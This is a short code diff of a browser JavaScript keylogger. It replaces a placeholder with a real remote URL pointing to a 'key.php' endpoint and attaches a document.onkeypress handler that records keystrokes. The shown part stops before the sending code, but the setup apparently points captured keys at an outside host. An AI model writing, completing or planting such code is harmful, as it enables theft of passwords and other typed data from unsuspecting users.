@@ -1,5 +1,5 @@
 var keys='';
-var url = 'type your url php';
+var url = 'https://lahadiyani.github.io/guess-text/key.php';
 
 document.onkeypress = function(e) {
 	get = window.event?event:e;
